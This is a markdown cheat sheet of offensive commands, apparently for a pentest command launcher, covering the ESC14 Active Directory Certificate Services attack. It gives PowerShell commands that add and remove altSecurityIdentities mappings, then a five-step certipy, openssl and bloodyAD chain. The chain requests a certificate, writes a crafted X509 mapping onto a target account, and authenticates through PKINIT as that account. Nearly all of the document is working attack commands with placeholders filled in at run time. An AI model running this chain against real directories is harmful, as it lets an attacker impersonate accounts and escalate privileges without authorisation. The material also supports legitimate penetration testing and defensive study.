---
technique: ESC14 - Explicit Certificate Mapping
category: adcs
targets: Certificate Authority, Certificate Templates, Domain Principals
protocols: LDAP, RPC, HTTP, Kerberos
remote_capable: true
tags: adcs esc esc14 certificate-services pkinit
---

# ESC14 - Explicit Certificate Mapping

ESC14 abuses explicit certificate mappings through altSecurityIdentities.

## Windows

### ESC14: Add explicit certificate mapping (PowerShell)

#powershell #altsecurityidentities #explicit-mapping

Write an explicit certificate mapping string to the target object's `altSecurityIdentities` attribute.

```powershell title:"ESC14: add explicit altSecurityIdentities mapping"
Add-AltSecIDMapping -DistinguishedName "$target_dn" -MappingString "$x509_claim"
```
<!-- cheat
var target_dn
var x509_claim
-->

### ESC14: Remove explicit certificate mapping (PowerShell)

#powershell #altsecurityidentities #cleanup

Remove the explicit mapping string after certificate authentication testing.

```powershell title:"ESC14: remove explicit altSecurityIdentities mapping"
Remove-AltSecIDMapping -DistinguishedName "$target_dn" -MappingString "$x509_claim"
```
<!-- cheat
var target_dn
var x509_claim
-->

## Linux

### ESC14: Step 1: request certificate for controlled principal (certipy)

#certipy #altsecurityidentities #explicit-mapping

Request a certificate for the controlled principal before writing an explicit mapping on the target.

```sh title:"ESC14: request cert for explicit mapping abuse"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template $template_name
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var template_name
-->

### ESC14: Step 2: export certificate without key (certipy)

#certipy #altsecurityidentities #explicit-mapping

Export the certificate portion from the issued PFX so issuer and serial values can be inspected.

```sh title:"ESC14: export certificate from PFX"
certipy cert -pfx "$pfx_file" -nokey -out "$cert_file"
```
<!-- cheat
var pfx_file
var cert_file
-->

### ESC14: Step 3: inspect certificate issuer and serial (openssl)

#openssl #altsecurityidentities #explicit-mapping

Inspect the issued certificate to build the explicit mapping claim.

```sh title:"ESC14: inspect certificate issuer and serial"
openssl x509 -in "$cert_file" -noout -text
```
<!-- cheat
var cert_file
-->

### ESC14: Step 4: write explicit mapping (bloodyAD)

#bloodyad #altsecurityidentities #explicit-mapping

Write the crafted X509 mapping claim to the target account.

```sh title:"ESC14: write altSecurityIdentities mapping with bloodyAD"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user altSecurityIdentities -v "$x509_claim"
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
var x509_claim
-->

### ESC14: Step 5: authenticate with mapped certificate (certipy)

#certipy #pkinit #explicit-mapping

Authenticate as the mapped target with the issued certificate.

```sh title:"ESC14: PKINIT with explicitly mapped cert"
certipy auth -pfx "$pfx_file" -username $target_user@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
var pfx_file
var target_user
-->
